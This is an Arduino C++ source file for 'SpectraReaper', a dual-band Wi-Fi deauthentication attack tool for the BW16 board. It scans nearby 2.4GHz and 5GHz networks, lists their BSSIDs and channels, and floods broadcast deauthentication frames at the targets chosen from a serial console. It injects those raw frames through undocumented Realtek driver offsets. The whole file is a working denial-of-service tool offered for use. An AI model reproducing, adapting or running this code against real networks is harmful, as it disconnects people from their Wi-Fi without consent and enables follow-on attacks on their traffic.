/*
 * SpectraReaper
 * A tool that deauth 2.4GHz and 5GHz Wi-Fi networks via BW16 on serial console.
 * Author - WireBits
 */

#include <map>
#include <vector>
#include <WiFi.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <WiFiClient.h>
#include <wifi_structures.h>

#define FRAMES_PER_DEAUTH 10

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

uint8_t deauth_bssid[6];
int current_channel = 1;
bool is_scanning = false;
uint16_t deauth_reason = 2;
int current_deauth_index = 0;
unsigned long lastDeauthTime = 0;

std::vector<int> deauth_wifis;
std::vector<WiFiScanResult> scan_results;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  scan_results.clear();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, HIGH);
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH);
    digitalWrite(LED_B, LOW);
    return 0;
  }
  return 1;
}

void startShowScannedNetworks() {
  Serial.print("[*] Scanning for networks...\n");
  if (scanNetworks() == 0) {
    is_scanning = true;
    Serial.println("[*] Scanned WiFi Networks:");
    for (int i = 0; i < scan_results.size(); i++) {
      String frequency = (scan_results[i].channel <= 14) ? "2.4GHz" : "5GHz";
      char indexStr[3];
      snprintf(indexStr, sizeof(indexStr), "%02d", i);
      Serial.println("┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈");
      Serial.print("[" + String(indexStr) + "] - SSID    : "); Serial.println(scan_results[i].ssid);
      Serial.print("       BSSID   : "); Serial.println(scan_results[i].bssid_str);
      Serial.print("       Channel : "); Serial.println(scan_results[i].channel);
      Serial.print("       RSSI    : "); Serial.println(scan_results[i].rssi);
      Serial.print("       Frequency : "); Serial.println(frequency);
      Serial.println("┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈");
    }
  } else {
    Serial.println("[!] Scanning Failed!");
  }
}

void sendWifiRawManagementFrames(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);
  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

void sendDeauthenticationFrames(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  sendWifiRawManagementFrames(&frame, sizeof(DeauthFrame));
}

bool has24GHz() {
  for (int idx : deauth_wifis) {
    if (scan_results[idx].channel <= 14) return true;
  }
  return false;
}

bool has5GHz() {
  for (int idx : deauth_wifis) {
    if (scan_results[idx].channel > 14) return true;
  }
  return false;
}

bool isMixedBandSelection() {
  bool has24 = false;
  bool has5 = false;
  for (int idx : deauth_wifis) {
    if (scan_results[idx].channel <= 14) {
      has24 = true;
    } else {
      has5 = true;
    }
  }
  return has24 && has5;
}

void showHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  scan            - Scan for WiFi networks");
  Serial.println("  deauth X Y Z    - Start single or multiple-network deauth [X, Y, Z are indice(s)]");
  Serial.println("  deauth off      - Stop deauth attack");
  Serial.println("  help            - Show this help\n");
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  wifi_on(RTW_MODE_STA);
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("|     ╔═╗╔═╗╔═╗╔═╗╔╦╗╦═╗╔═╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗     |\n");
  Serial.print("|     ╚═╗╠═╝║╣ ║   ║ ╠╦╝╠═╣╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝     |\n");
  Serial.print("|     ╚═╝╩  ╚═╝╚═╝ ╩ ╩╚═╩ ╩╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═     |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("| 2.4GHz and 5GHz Dual Band Deauthentication Tool |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("|                Author - WireBits                |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("|        Type 'help' for available commands       |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readString();
    command.trim();
    if (command == "scan") {
      startShowScannedNetworks();
    } else if (command.startsWith("deauth ")) {
      String arg = command.substring(7);
      arg.trim();
      if (arg == "off") {
        deauth_wifis.clear();
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        Serial.println("[*] Deauth Attack Stopped!");
      } else {
        deauth_wifis.clear();
        int spaceIndex = 0;
        while (arg.length() > 0) {
          spaceIndex = arg.indexOf(' ');
          String token;
          if (spaceIndex == -1) {
            token = arg;
            arg = "";
          } else {
            token = arg.substring(0, spaceIndex);
            arg = arg.substring(spaceIndex + 1);
          }
          token.trim();
          if (token.length() == 0)
            continue;
          int index = token.toInt();
          if (index >= 0 && index < scan_results.size()) {
            deauth_wifis.push_back(index);
          } else {
            Serial.print("[!] Invalid index: ");
            Serial.println(token);
          }
        }
        if (!deauth_wifis.empty()) {
          current_deauth_index = 0;
          bool is24 = has24GHz();
          bool is5  = has5GHz();
            if (is24 && is5) {
              digitalWrite(LED_R, HIGH);
              digitalWrite(LED_G, LOW);
              digitalWrite(LED_B, HIGH);
            } else if (is5) {
              digitalWrite(LED_R, HIGH);
              digitalWrite(LED_G, HIGH);
              digitalWrite(LED_B, LOW);
            } else {
              digitalWrite(LED_R, HIGH);
              digitalWrite(LED_G, LOW);
              digitalWrite(LED_B, LOW);
            }
          Serial.println("[*] Deauth Attack Started On :");
          for (int n : deauth_wifis) {
            Serial.print("Network Index : ");
            Serial.println(n);
          }
        } else {
          Serial.println("[!] Select correct indice(s) from scanned networks!");
        }
      }
    }
    else if (command == "help") {
      showHelp();
    }
  }
  if (!deauth_wifis.empty() && millis() - lastDeauthTime >= 100) {
    lastDeauthTime = millis();
    int idx = deauth_wifis[current_deauth_index];
    memcpy(deauth_bssid, scan_results[idx].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      sendDeauthenticationFrames(deauth_bssid,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",deauth_reason);
      delay(5);
    }
    current_deauth_index++;
    if (current_deauth_index >= deauth_wifis.size()) {
      current_deauth_index = 0;
    }
  }
}